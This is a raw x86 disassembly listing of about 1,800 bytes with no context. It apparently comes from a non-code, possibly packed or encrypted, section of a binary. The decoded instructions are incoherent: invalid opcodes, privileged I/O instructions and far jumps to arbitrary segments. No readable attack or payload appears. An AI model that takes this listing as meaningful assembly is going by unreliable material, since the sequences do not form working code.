  422738:	scas   eax,DWORD PTR es:[edi]
  422739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42273a:	push   ss
  42273b:	add    DWORD PTR [ebx],ebx
  42273d:	push   eax
  42273e:	fild   DWORD PTR [edx+0x51b7dd14]
  422744:	mov    ebx,0xa11f53fd
  422749:	fidivr WORD PTR gs:[ebx+0x52186c8]
  422750:	in     eax,0xd0
  422752:	add    BYTE PTR [eax+0xe],dh
  422755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422756:	push   0xb9b92413
  42275b:	rcl    esp,cl
  42275d:	pop    esi
  42275e:	imul   esi,edi,0xfffffff3
  422761:	cmc    
  422762:	push   cs
  422763:	in     al,dx
  422764:	adc    DWORD PTR [esi],eax
  422766:	data16 cmp al,0xa3
  422769:	ss and eax,0x3707947f
  42276f:	mov    eax,ds:0x6e76b42
  422774:	rol    DWORD PTR [eax+0x33ce923d],0x92
  42277b:	retf   
  42277c:	test   BYTE PTR [ecx+0x34b004e5],al
  422782:	xchg   edi,eax
  422783:	call   0x8334:0x57ebd13e
  42278a:	xchg   ebp,eax
  42278b:	fcomp  DWORD PTR [ebx+0x20fa1664]
  422791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422792:	fwait
  422793:	mov    ebx,0x6f64e4d7
  422798:	adc    BYTE PTR [eax+eax*2-0x7f0fa94e],0xd5
  4227a0:	sbb    bl,al
  4227a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227a4:	pop    ecx
  4227a5:	pop    edx
  4227a6:	cwde   
  4227a7:	pop    ebx
  4227a8:	jecxz  0x422800
  4227aa:	daa    
  4227ab:	aaa    
  4227ac:	mov    edx,0xb944e8f2
  4227b1:	pusha  
  4227b2:	sti    
  4227b3:	add    dh,dl
  4227b5:	dec    esi
  4227b6:	nop
  4227b7:	mov    edx,0xcd28f109
  4227bc:	mov    bl,0x5d
  4227be:	sbb    al,0x24
  4227c0:	pushf  
  4227c1:	pop    eax
  4227c2:	pushf  
  4227c3:	out    dx,eax
  4227c4:	hlt    
  4227c5:	cmp    BYTE PTR [edx],0x93
  4227c8:	rcl    dh,cl
  4227ca:	mov    dh,0x73
  4227cc:	xchg   ebx,eax
  4227cd:	cmp    al,0xf1
  4227cf:	stos   DWORD PTR es:[edi],eax
  4227d0:	stos   BYTE PTR es:[edi],al
  4227d1:	fisubr DWORD PTR [eax+0x13]
  4227d4:	ja     0x422815
  4227d6:	push   eax
  4227d7:	mov    bh,0x3a
  4227d9:	shr    BYTE PTR [eax-0x7],0x40
  4227dd:	adc    eax,0x4dcf5100
  4227e2:	mov    edx,0x58851282
  4227e7:	aam    0x30
  4227e9:	dec    esi
  4227ea:	cmp    DWORD PTR [edi+0x61e61025],eax
  4227f0:	call   0x9447:0xaf880b8c
  4227f7:	xchg   ebx,eax
  4227f8:	fst    QWORD PTR [eax-0x27]
  4227fb:	adc    ebp,DWORD PTR [ecx+0x1258bc5d]
  422801:	push   esp
  422802:	push   edi
  422803:	adc    edi,DWORD PTR [edx]
  422805:	icebp  
  422806:	push   cs
  422807:	push   ebp
  422808:	sub    al,0x9e
  42280a:	scas   al,BYTE PTR es:[edi]
  42280b:	clc    
  42280c:	shr    bh,0x3d
  42280f:	inc    eax
  422810:	xor    eax,0xc1fd9440
  422815:	(bad)  
  422816:	fs popf 
  422818:	(bad)  
  422819:	push   ss
  42281a:	arpl   bp,cx
  42281c:	mov    ah,cl
  42281e:	jno    0x4227e9
  422820:	nop
  422821:	js     0x422862
  422823:	fs das 
  422825:	and    eax,0x8f0c5747
  42282a:	xor    DWORD PTR [ecx+ebx*1],ebp
  42282d:	jmp    0x1bb18249
  422832:	adc    BYTE PTR [edi-0x6f9d4200],0x1b
  422839:	clc    
  42283a:	xor    al,0x20
  42283c:	xchg   BYTE PTR [edi+0x42],al
  42283f:	jmp    0xd8c0:0x25b79a43
  422846:	repnz mov ds:0x4af6f567,eax
  42284c:	push   ds
  42284d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42284e:	mov    edx,0x644a2280
  422853:	ficomp DWORD PTR [ebp+0x66]
  422856:	adc    esi,edx
  422858:	dec    ebp
  422859:	sub    DWORD PTR [ecx+0x248e812b],ecx
  42285f:	imul   edi,DWORD PTR [ebp-0x74],0x7edd6a76
  422866:	pop    esi
  422867:	fisttp QWORD PTR [ebx]
  422869:	mov    ah,0xde
  42286b:	sbb    eax,DWORD PTR [ecx]
  42286d:	int3   
  42286e:	jno    0x4228bf
  422870:	and    WORD PTR [edx-0xacc98ac],bx
  422877:	jbe    0x4228f1
  422879:	scas   al,BYTE PTR es:[edi]
  42287a:	inc    edx
  42287b:	mov    dh,0x16
  42287d:	mov    edx,0xbb94e29
  422882:	or     ah,bl
  422884:	xchg   ebx,eax
  422885:	pop    ss
  422886:	sub    ebp,DWORD PTR [eax+ebx*8+0x61ef1147]
  42288d:	jge    0x42290a
  42288f:	ins    DWORD PTR es:[edi],dx
  422890:	in     eax,dx
  422891:	test   DWORD PTR [esi+0xc],esp
  422894:	push   es
  422895:	cmc    
  422896:	and    al,0xa8
  422898:	cdq    
  422899:	inc    edx
  42289a:	test   eax,0x5dbd2a9
  42289f:	stc    
  4228a0:	adc    BYTE PTR [ebp+0x7f88f6fd],0xc0
  4228a7:	pmulhw mm1,QWORD PTR [edx-0x17]
  4228ab:	sbb    eax,0xdba38304
  4228b0:	push   esp
  4228b1:	popf   
  4228b2:	xlat   BYTE PTR ds:[ebx]
  4228b3:	scas   al,BYTE PTR es:[edi]
  4228b4:	out    0x92,al
  4228b6:	adc    al,0x2
  4228b8:	mov    bh,0xdc
  4228ba:	std    
  4228bb:	push   ebp
  4228bc:	mov    esp,0xbfa27659
  4228c1:	sub    al,0x38
  4228c3:	ja     0x4228a7
  4228c5:	mov    esp,0x986bc34a
  4228ca:	mov    bh,0xd0
  4228cc:	jle    0x422867
  4228ce:	xchg   edi,eax
  4228cf:	dec    esi
  4228d0:	or     ecx,edi
  4228d2:	mov    al,0xbd
  4228d4:	cdq    
  4228d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228d6:	aam    0x3e
  4228d8:	jne    0x4228a4
  4228da:	ds cwde 
  4228dc:	imul   esi,DWORD PTR [edi+0x359afe15],0x6644219
  4228e6:	clc    
  4228e7:	and    edx,eax
  4228e9:	dec    esi
  4228ea:	hlt    
  4228eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228ec:	call   0xa22d0be0
  4228f1:	push   cs
  4228f2:	sub    DWORD PTR [eax-0x5c],eax
  4228f5:	push   esp
  4228f6:	jnp    0x4228b5
  4228f8:	imul   edx,DWORD PTR [ebp-0x3eea03a0],0xffffffbc
  4228ff:	(bad)  
  422900:	sbb    BYTE PTR [ebx+edx*4+0x47],dl
  422904:	je     0x4228de
  422906:	xor    eax,0x759b4068
  42290b:	push   ebp
  42290c:	mov    ebp,0xaedcd4a6
  422911:	xchg   esi,eax
  422912:	or     esi,ecx
  422914:	and    BYTE PTR [edx-0x32],dh
  422917:	std    
  422918:	sub    al,0xa0
  42291a:	xor    BYTE PTR [esi+0x77a2de42],0x90
  422921:	mov    BYTE PTR [edx+0x7],al
  422924:	jle    0x4228b1
  422926:	lods   al,BYTE PTR ds:[esi]
  422927:	sub    edx,edx
  422929:	in     eax,dx
  42292a:	call   DWORD PTR [ebp+0x6a2c233]
  422930:	retf   
  422931:	mov    al,ds:0x4ffd58f9
  422936:	arpl   WORD PTR [eax-0x1e],bx
  422939:	inc    esp
  42293a:	mov    ah,0x3c
  42293c:	cld    
  42293d:	jmp    0x422976
  42293f:	retf   0x1d5d
  422942:	pop    ebx
  422943:	gs inc edi
  422945:	mov    edi,0x6708d74e
  42294a:	ja     0x4229c6
  42294c:	scas   al,BYTE PTR es:[edi]
  42294d:	cmp    eax,0x73248788
  422952:	je     0x4228f8
  422954:	pop    ebp
  422955:	mov    dh,0xd9
  422957:	lods   eax,DWORD PTR ds:[esi]
  422958:	push   ss
  422959:	inc    ecx
  42295a:	lea    ebp,[ecx+0x65]
  42295d:	mov    ch,BYTE PTR [edi]
  42295f:	inc    ecx
  422960:	adc    esi,DWORD PTR [ecx+0x1626eb76]
  422966:	nop
  422967:	fisttp QWORD PTR [eax]
  422969:	leave  
  42296a:	das    
  42296b:	mov    esp,0xbb576eec
  422970:	shr    DWORD PTR gs:[ebx+0x47],0xfa
  422975:	cli    
  422976:	or     dh,ch
  422978:	adc    al,0x94
  42297a:	fwait
  42297b:	stc    
  42297c:	bound  esp,QWORD PTR [ebx+0x55]
  42297f:	pop    edx
  422980:	or     al,BYTE PTR [edi+0x20]
  422983:	inc    edi
  422984:	xor    BYTE PTR [ecx-0x7fa67549],ch
  42298a:	sbb    eax,0x9aeeaf2f
  42298f:	mov    edi,0x6add1b6f
  422994:	loopne 0x4229fc
  422996:	out    dx,eax
  422997:	test   DWORD PTR [ebx],0x96da7f5c
  42299d:	and    BYTE PTR [ecx],bl
  42299f:	mov    esi,0xe87dca73
  4229a4:	mov    edx,0xcaa4f8fa
  4229a9:	add    BYTE PTR [ecx],0x38
  4229ac:	push   0xffffff87
  4229ae:	jb     0x4229a6
  4229b0:	(bad)  
  4229b1:	fadd   DWORD PTR [edx]
  4229b3:	pushf  
  4229b4:	pop    ds
  4229b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229b6:	mov    ?,WORD PTR fs:[ebp-0x7f9e9939]
  4229bd:	xor    BYTE PTR [ecx],ah
  4229bf:	jp     0x4229e3
  4229c1:	add    al,0xc1
  4229c3:	pop    ebx
  4229c4:	mov    edi,0xffbd9e2e
  4229c9:	fist   DWORD PTR [edi]
  4229cb:	and    DWORD PTR [eax+0x54],ebp
  4229ce:	fistp  WORD PTR [edi+0x44a8c78c]
  4229d4:	add    al,0xd2
  4229d6:	cmp    esp,DWORD PTR [edx]
  4229d8:	clc    
  4229d9:	sub    ecx,DWORD PTR [edi]
  4229db:	mov    eax,ds:0xcfaea7cc
  4229e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229e1:	pop    ebp
  4229e2:	stos   BYTE PTR es:[edi],al
  4229e3:	inc    edi
  4229e4:	loop   0x422a51
  4229e6:	imul   ebx,ecx,0x4c50faba
  4229ec:	(bad)  
  4229ed:	mov    BYTE PTR [esp+eiz*4-0x19],ah
  4229f1:	push   0xe0e2bf56
  4229f6:	rcr    BYTE PTR [edi],0xef
  4229f9:	inc    esi
  4229fa:	ins    DWORD PTR es:[edi],dx
  4229fb:	cmp    BYTE PTR [eax-0x5fb993df],bl
  422a01:	sub    ch,0x35
  422a04:	and    BYTE PTR [ecx+0x5043f3c],dl
  422a0a:	mov    DWORD PTR [esi+ecx*2-0x726ad89d],edx
  422a11:	out    dx,al
  422a12:	pusha  
  422a13:	push   ebp
  422a14:	ret    
  422a15:	(bad)  
  422a17:	or     ah,BYTE PTR [edx-0x19f38797]
  422a1d:	sti    
  422a1e:	es inc esi
  422a20:	stc    
  422a21:	sub    ebp,DWORD PTR [ecx]
  422a23:	in     al,0x51
  422a25:	inc    esi
  422a26:	mov    cl,0x41
  422a28:	enter  0xdc5c,0x32
  422a2c:	or     DWORD PTR [ecx+0x4dc7182c],ebp
  422a32:	fisubr DWORD PTR [esi+edi*8+0x4b979c14]
  422a39:	sub    al,0xe0
  422a3b:	ja     0x422a0d
  422a3d:	xor    DWORD PTR [ebp-0x6f],0xffffffc9
  422a41:	arpl   WORD PTR [ecx-0x41749231],bp
  422a47:	popf   
  422a48:	mov    esp,0x3c5b84fe
  422a4d:	call   0xe39aaff9
  422a52:	and    eax,ebp
  422a54:	xchg   edi,eax
  422a55:	jmp    0x798a:0xd9d772e3
  422a5c:	mov    esi,0xf48f078
  422a61:	jle    0x422acd
  422a63:	shr    DWORD PTR ds:0xf339dab5,cl
  422a69:	sbb    al,0x9e
  422a6b:	add    eax,0x951caaae
  422a70:	pop    eax
  422a71:	lods   al,BYTE PTR ds:[esi]
  422a72:	retf   
  422a73:	aam    0x31
  422a75:	push   ebx
  422a76:	push   es
  422a77:	stc    
  422a78:	fisub  WORD PTR [ecx+0x34621e25]
  422a7e:	inc    edi
  422a7f:	xlat   BYTE PTR ds:[ebx]
  422a80:	or     DWORD PTR [eax+0x20],edi
  422a83:	and    esi,DWORD PTR [esi]
  422a85:	jl     0x422aea
  422a87:	call   0xc8e0:0xadb7a4aa
  422a8e:	jo     0x422a35
  422a90:	or     bh,BYTE PTR [eax+0x7c]
  422a93:	scas   al,BYTE PTR es:[edi]
  422a94:	xchg   esp,eax
  422a95:	enter  0x71d6,0xe9
  422a99:	leave  
  422a9a:	add    eax,0xd82aff60
  422a9f:	test   DWORD PTR [ecx+0x7cc1c889],0xd052d956
  422aa9:	sbb    ch,BYTE PTR [eax+0x1fa2cd2]
  422aaf:	dec    ecx
  422ab0:	out    0xa8,eax
  422ab2:	inc    esi
  422ab3:	jle    0x422a3c
  422ab5:	mov    ?,WORD PTR [ebx+0x1f]
  422ab8:	sbb    eax,0x873559d7
  422abd:	cwde   
  422abe:	pop    ecx
  422abf:	dec    ecx
  422ac0:	jmp    0x76c5:0xb05a524f
  422ac7:	sub    bl,BYTE PTR [ecx]
  422ac9:	scas   eax,DWORD PTR es:[edi]
  422aca:	repz mov WORD PTR [ebx],fs
  422acd:	mov    ch,0xfa
  422acf:	icebp  
  422ad0:	fmul   st,st(7)
  422ad2:	pop    ebp
  422ad3:	pusha  
  422ad4:	push   edx
  422ad5:	jecxz  0x422a71
  422ad7:	sub    bl,dh
  422ad9:	popf   
  422ada:	stos   DWORD PTR es:[edi],eax
  422adb:	(bad)  
  422adc:	int    0xd3
  422ade:	ret    
  422adf:	inc    ebp
  422ae0:	sbb    DWORD PTR [ecx+0x0],esp
  422ae3:	push   ss
  422ae4:	repz xor dh,BYTE PTR [edi]
  422ae7:	pop    edi
  422ae8:	mov    WORD PTR [ecx],fs
  422aea:	xor    dl,BYTE PTR [ecx]
  422aec:	cdq    
  422aed:	es jp  0x422b40
  422af0:	neg    BYTE PTR [edx+esi*4-0x76dcf3d0]
  422af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422af8:	push   esp
  422af9:	jecxz  0x422b6e
  422afb:	data16 and bh,bh
  422afe:	mov    bl,bl
  422b00:	lock pop ebx
  422b02:	pusha  
  422b03:	outs   dx,BYTE PTR ds:[esi]
  422b04:	scas   al,BYTE PTR es:[edi]
  422b05:	mov    dh,0x2b
  422b07:	add    al,BYTE PTR [ebp-0x1371e9be]
  422b0d:	and    dh,BYTE PTR [edx+0x5fb6cbe8]
  422b13:	test   al,0x68
  422b15:	(bad)  
  422b16:	jle    0x422b92
  422b18:	push   0x2288be76
  422b1d:	ss pop edx
  422b1f:	shl    BYTE PTR [esi-0x4d],cl
  422b22:	xchg   ebx,eax
  422b23:	inc    ebx
  422b24:	js     0x422b4b
  422b26:	test   DWORD PTR [edi+0x1c1b8a81],0x4b7a53a
  422b30:	add    esi,ebx
  422b32:	xor    BYTE PTR [eax+0x1d],0x20
  422b36:	mov    al,ds:0xb34b076
  422b3b:	push   ebx
  422b3c:	mov    WORD PTR [ebx+ebx*2-0x6f],bp
  422b41:	push   es
  422b42:	pushf  
  422b43:	xlat   BYTE PTR ds:[ebx]
  422b44:	mov    ds:0xeebc6c9,al
  422b49:	addr16 std 
  422b4b:	clc    
  422b4c:	ja     0x422b24
  422b4e:	sahf   
  422b4f:	int3   
  422b50:	jmp    0x2ecd4e05
  422b55:	push   ecx
  422b56:	sub    edi,DWORD PTR [ebx-0x2babf6c8]
  422b5c:	clc    
  422b5d:	sbb    al,0x7d
  422b5f:	xchg   esi,eax
  422b60:	mov    ?,WORD PTR [eax]
  422b62:	sbb    ecx,DWORD PTR [edi]
  422b64:	adc    DWORD PTR [ecx+0x2f],esi
  422b67:	out    dx,eax
  422b68:	(bad)  
  422b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b6a:	push   ss
  422b6b:	mov    cs,WORD PTR [esi+0x1f373af3]
  422b71:	ins    DWORD PTR es:[edi],dx
  422b72:	rcl    al,0xe8
  422b75:	sub    edi,esi
  422b77:	cmp    edi,ebx
  422b79:	shl    BYTE PTR [ebp+0x63],1
  422b7c:	dec    esp
  422b7d:	xor    ebp,DWORD PTR [edx-0x4b]
  422b80:	addr16 cmc 
  422b82:	mov    bh,0x2b
  422b84:	xchg   BYTE PTR [esi+0x2b],al
  422b87:	imul   esi,DWORD PTR [ecx+0x1e],0xb24b1a6c
  422b8e:	data16 hlt 
  422b90:	pusha  
  422b91:	lahf   
  422b92:	mov    ecx,0xc7c5979
  422b97:	jb     0x422b35
  422b99:	adc    DWORD PTR [ebp+0x708718e9],0xffffffc8
  422ba0:	lahf   
  422ba1:	hlt    
  422ba2:	jp     0x422be6
  422ba4:	rcr    DWORD PTR [ebp-0x630b5ac6],0x35
  422bab:	clc    
  422bac:	dec    ebp
  422bad:	sbb    dl,BYTE PTR [ebx+0x34]
  422bb0:	mov    ecx,0x7a7a6c48
  422bb5:	and    eax,0xfab633e6
  422bba:	dec    esi
  422bbb:	xchg   DWORD PTR [edi+0x5b2dba6d],ecx
  422bc1:	lods   eax,DWORD PTR ds:[esi]
  422bc2:	sub    eax,0xf6ba78c
  422bc7:	push   edi
  422bc8:	jmp    0x83ee:0xf16cb461
  422bcf:	inc    ebp
  422bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bd1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  422bd3:	jmp    0x7ddc:0x4f1d17d1
  422bda:	xor    BYTE PTR [esi+0x71f0c0e8],0x9c
  422be1:	lahf   
  422be2:	in     eax,dx
  422be3:	in     eax,dx
  422be4:	in     al,dx
  422be5:	in     al,0xe6
  422be7:	sbb    edi,DWORD PTR [esi-0x7cd6d1d1]
  422bed:	dec    edi
  422bee:	jge    0x422b76
  422bf0:	bound  ebx,QWORD PTR [ebx+0x4537e490]
  422bf6:	xchg   edi,eax
  422bf7:	and    DWORD PTR [esi],eax
  422bf9:	xchg   edx,eax
  422bfa:	icebp  
  422bfb:	mov    edi,0x8c479954
  422c00:	pusha  
  422c01:	sub    BYTE PTR [ebx+0x3],bh
  422c04:	sbb    ecx,edi
  422c06:	jge    0x422b8a
  422c08:	clc    
  422c09:	imul   DWORD PTR [esi+0x67]
  422c0c:	xor    al,0xb0
  422c0e:	lods   al,BYTE PTR ds:[esi]
  422c0f:	mov    eax,0x833900be
  422c14:	push   ds
  422c15:	pop    ebx
  422c16:	adc    al,0x76
  422c18:	call   0x32b2:0xe2e35b2e
  422c1f:	aad    0xec
  422c21:	lods   eax,DWORD PTR ds:[esi]
  422c22:	jmp    0x3cb8:0x50a1891c
  422c29:	jp     0x422c75
  422c2b:	ins    DWORD PTR es:[edi],dx
  422c2c:	or     ah,BYTE PTR [edi+0x34]
  422c2f:	jns    0x422c04
  422c31:	cmp    BYTE PTR [eax-0x37d7fcc2],0x87
  422c38:	mov    ds:0x6af3e69,eax
  422c3d:	mov    edx,gs
  422c3f:	lds    edx,FWORD PTR [edi]
  422c41:	(bad)  
  422c42:	push   ebp
  422c43:	sbb    al,0xcf
  422c45:	int3   
  422c46:	loopne 0x422c50
  422c48:	(bad)  
  422c49:	pusha  
  422c4a:	xchg   BYTE PTR [eax+0x57],ch
  422c4d:	test   eax,0x82f40099
  422c52:	fdiv   DWORD PTR [eax+eiz*8+0x48]
  422c56:	mov    edx,cs
  422c58:	mov    al,0x41
  422c5a:	jg     0x422c54
  422c5c:	pushf  
  422c5d:	adc    ecx,DWORD PTR [edi+0x41]
  422c60:	(bad)  [edx]
  422c62:	mov    edx,0xa92ec313
  422c67:	scas   eax,DWORD PTR es:[edi]
  422c68:	mov    ah,BYTE PTR [eax+0x7d]
  422c6b:	inc    edx
  422c6c:	leave  
  422c6d:	or     eax,0xa76b4ec6
  422c72:	and    dl,0x68
  422c75:	push   eax
  422c76:	add    BYTE PTR [edi],cl
  422c78:	ja     0x422c63
  422c7a:	fist   WORD PTR ss:[ebp+0x2bde1f02]
  422c81:	in     eax,dx
  422c82:	push   ss
  422c83:	fisubr WORD PTR [esi]
  422c85:	pop    ebx
  422c86:	sub    al,0x61
  422c88:	dec    ecx
  422c89:	pop    es
  422c8a:	adc    DWORD PTR [edx+0x49e09312],0xfffffff5
  422c91:	stc    
  422c92:	mov    dh,0x2c
  422c94:	imul   edi,DWORD PTR [edx+0x69d05ce5],0x46
  422c9b:	pusha  
  422c9c:	jbe    0x422d1b
  422c9e:	push   esi
  422c9f:	dec    esi
  422ca0:	(bad)  [edx+0x11]
  422ca3:	cmp    dh,0x39
  422ca6:	push   esi
  422ca7:	dec    esp
  422ca8:	dec    eax
  422ca9:	iret   
  422caa:	push   cs
  422cab:	jne    0x422cb5
  422cad:	fisubr WORD PTR [ecx+0x54e904ff]
  422cb3:	inc    edx
  422cb4:	inc    ecx
  422cb5:	rol    BYTE PTR [ecx+0x7f],cl
  422cb8:	jae    0x422d2b
  422cba:	xor    esi,ebp
  422cbc:	ror    BYTE PTR [eax-0x17],1
  422cbf:	mov    WORD PTR [edx+0x604cd564],gs
  422cc5:	ins    DWORD PTR es:[edi],dx
  422cc6:	xor    ah,ch
  422cc8:	add    DWORD PTR [ebx],esp
  422cca:	xor    DWORD PTR [edx-0x724ea726],edi
  422cd0:	inc    ecx
  422cd1:	inc    eax
  422cd2:	daa    
  422cd3:	cmp    bh,bh
  422cd5:	repnz pop esp
  422cd7:	mov    esp,DWORD PTR [edx]
  422cd9:	cmp    DWORD PTR [esi],esp
  422cdb:	imul   ebp,eax,0x35f2f618
  422ce1:	fadd   DWORD PTR [edx+edi*8]
  422ce4:	push   eax
  422ce5:	or     ah,BYTE PTR [ebx-0x7]
  422ce8:	dec    edx
  422ce9:	out    dx,al
  422cea:	and    dh,ah
  422cec:	sub    BYTE PTR [edi+0x500baf24],al
  422cf2:	dec    ebp
  422cf3:	add    BYTE PTR [ecx+0x6a3a06fc],0x1b
  422cfa:	sub    eax,0x5642472e
  422cff:	out    dx,al
  422d00:	mov    WORD PTR [edi+0x10c28b81],ss
  422d06:	ficomp DWORD PTR [eax+0x62]
  422d09:	retf   0x2dab
  422d0c:	stos   BYTE PTR es:[edi],al
  422d0d:	xor    bh,bl
  422d0f:	jbe    0x422cd4
  422d11:	or     al,0x46
  422d13:	retf   0xec0f
  422d16:	cmp    eax,0xdb8167e2
  422d1b:	popa   
  422d1c:	ror    esp,0x2e
  422d1f:	scas   al,BYTE PTR es:[edi]
  422d20:	dec    ebp
  422d21:	mov    WORD PTR [ecx*8+0x151556da],?
  422d28:	fiadd  WORD PTR [edi+0x7a]
  422d2b:	(bad)  
  422d2c:	pop    ds
  422d2d:	cdq    
  422d2e:	inc    edi
  422d2f:	pop    edi
  422d30:	dec    edx
  422d31:	movntps XMMWORD PTR [edi],xmm3
  422d34:	fldenv [edx+0x7bd81ed3]
  422d3a:	push   edi
  422d3b:	jo     0x422d3c
  422d3d:	sbb    DWORD PTR [eax-0x18b0edce],eax
  422d43:	fsubr  QWORD PTR [ebx-0x55]
  422d46:	aam    0xe7
  422d48:	cmc    
  422d49:	jno    0x422d45
  422d4b:	or     eax,0x7fea43c4
  422d50:	popf   
  422d51:	unpcklps xmm7,XMMWORD PTR [eax+edi*8-0x6e]
  422d56:	mov    al,ds:0x8c644270
  422d5b:	add    edi,edi
  422d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d5f:	call   0x6a12:0x8a0d6246
  422d66:	cmc    
  422d67:	fsubr  DWORD PTR [edx+0x63]
  422d6a:	dec    eax
  422d6b:	leave  
  422d6c:	sub    eax,DWORD PTR [ecx]
  422d6e:	pushf  
  422d6f:	dec    ebp
  422d70:	inc    esp
  422d71:	cdq    
  422d72:	clc    
  422d73:	push   ds
  422d74:	rcr    DWORD PTR [edi+ecx*4-0x58a24e5a],0xa6
  422d7c:	or     eax,0xa7469a16
  422d81:	sub    DWORD PTR [ecx-0x41],esi
  422d84:	xchg   esi,eax
  422d85:	cli    
  422d86:	pusha  
  422d87:	pop    ecx
  422d88:	scas   al,BYTE PTR es:[edi]
  422d89:	inc    ebx
  422d8a:	into   
  422d8b:	push   cs
  422d8c:	(bad)  
  422d8d:	dec    esp
  422d8e:	mov    esi,0x7fc48edd
  422d93:	inc    edx
  422d94:	repz push ebx
  422d96:	sub    eax,0x5afcda72
  422d9b:	push   0x1bf7a9af
  422da0:	ins    DWORD PTR es:[edi],dx
  422da1:	xor    al,0xcd
  422da3:	mov    al,0x40
  422da5:	in     al,dx
  422da6:	mov    bh,0xb3
  422da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422da9:	cs mov cl,0x39
  422dac:	mov    ds:0xb6a1f7b8,al
  422db1:	cmp    BYTE PTR [edi],al
  422db3:	mov    BYTE PTR [esi],cl
  422db5:	wrmsr  
  422db7:	lock jmp 0x69f05a8c
  422dbd:	daa    
  422dbe:	fcomp  st(7)
  422dc0:	inc    bx
  422dc2:	cmp    DWORD PTR [eiz*8-0x67a32d7b],ebp
  422dc9:	leave  
  422dca:	push   eax
  422dcb:	mov    al,ds:0x4e78b65d
  422dd0:	sar    DWORD PTR [edi-0x12e1a4df],1
  422dd6:	out    dx,al
  422dd7:	aas    
  422dd8:	push   0xbce4fe29
  422ddd:	call   FWORD PTR [ebp+0x74]
  422de0:	mov    ds,WORD PTR [edx]
  422de2:	push   edi
  422de3:	pop    ebx
  422de4:	cmp    BYTE PTR [ebx-0x5e],ch
  422de7:	cmp    al,BYTE PTR [eax-0x65]
  422dea:	xchg   edx,eax
  422deb:	cld    
  422dec:	inc    ebx
  422ded:	pop    esp
  422dee:	pop    edx
  422def:	adc    BYTE PTR [ebx-0x71c8f7fe],bh
  422df5:	xlat   BYTE PTR ds:[ebx]
  422df6:	add    ebp,DWORD PTR [eax+0x5b]
  422df9:	adc    DWORD PTR [edi+0x62],eax
  422dfc:	jmp    0x53165933
  422e01:	dec    ecx
  422e02:	xor    eax,0x51453f5d
  422e07:	add    eax,0x30c63ace
  422e0c:	inc    esp
  422e0d:	jmp    0x422daf
  422e0f:	call   0x7a342400
  422e14:	call   0x17ba27c6
  422e19:	popf   
  422e1a:	pop    ecx
  422e1b:	js     0x422da9
  422e1d:	ja     0x422e5a
  422e1f:	add    al,0x81
  422e21:	jg     0x422e36
  422e23:	xor    BYTE PTR [ecx+0x45acae76],bh
  422e29:	cs adc ebx,esi
  422e2c:	inc    ebx
  422e2d:	enter  0x2e48,0xc7
  422e31:	in     eax,dx
  422e32:	popf   
  422e33:	imul   ecx,DWORD PTR ds:0x728a89a9,0xfa6f5285
  422e3d:	repz adc al,0x5b
  422e40:	push   ebp
  422e41:	(bad)  
  422e42:	xchg   edi,eax
  422e43:	xchg   esp,eax
  422e44:	retf   
  422e45:	sbb    cl,BYTE PTR [esi+0x46]
  422e48:	lock or BYTE PTR ds:0xd30255f9,al
  422e4f:	gs add ah,ah
  422e52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e53:	daa    
  422e54:	mov    DWORD PTR [esi+0x2e7bdd5],edx
  422e5a:	adc    DWORD PTR [ebx-0x212baa53],ebp
  422e60:	mov    ds:0x331c6686,eax
  422e65:	mov    bh,0x50
  422e67:	call   0x5161:0x2c1c1850
  422e6e:	call   DWORD PTR [eax+ebx*4]
  422e71:	mov    esp,0x70f928c4
  422e76:	cmp    DWORD PTR [ebx-0x6],edx
  422e79:	push   eax
  422e7a:	(bad)  
  422e7b:	xlat   BYTE PTR ds:[ebx]
  422e7c:	aaa    
  422e7d:	int3   
  422e7e:	addr16 pop ds
  422e80:	loope  0x422eca
  422e82:	daa    
  422e83:	retf   0x3fb7
  422e86:	nop
  422e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e88:	pop    es
  422e89:	push   es
  422e8a:	sbb    BYTE PTR [ecx+0x2595bc43],ah
  422e90:	xor    DWORD PTR [edx+ebp*8],eax
  422e93:	(bad)
  422e98:	xchg   esp,eax
  422e99:	pop    edx
  422e9a:	stc    
  422e9b:	ins    DWORD PTR es:[edi],dx
  422e9c:	cmp    esp,ebx
  422e9e:	mov    ch,0xf8
  422ea0:	cwde   
  422ea1:	enter  0xba82,0xed
  422ea5:	aas    
  422ea6:	into   
  422ea7:	and    ebp,0xffffffef
  422eaa:	jg     0x422ef1
  422eac:	cmp    DWORD PTR [esi],edx
  422eae:	test   al,0x43
  422eb0:	gs jno 0x422e56
  422eb3:	mov    cl,0x9a
  422eb5:	iret   
  422eb6:	pop    edx
  422eb7:	fwait
  422eb8:	xchg   edi,eax
  422eb9:	jb     0x422e64
  422ebb:	fdiv   st,st(5)
  422ebd:	out    dx,eax
  422ebe:	div    DWORD PTR [eax+0xd]
  422ec1:	dec    ebx
  422ec2:	inc    eax
  422ec3:	push   esi
  422ec4:	pop    es
  422ec5:	repnz sbb al,0x98
  422ec8:	xor    DWORD PTR [edi+0x19],esp
  422ecb:	cs xchg eax,eax
  422ece:	cdq    
  422ecf:	dec    ebp
  422ed0:	imul   esp,DWORD PTR [edx-0x7d90bbf],0xcad11d7d
  422eda:	imul   edi,DWORD PTR [ebx+0x1813692c],0xffffffa5
  422ee1:	mov    DWORD PTR [ecx-0x565adef4],eax
  422ee7:	sbb    ebx,DWORD PTR [bp+0x2d]
  422eeb:	push   ss
  422eec:	mov    BYTE PTR [eax+0x52dade3f],0xda
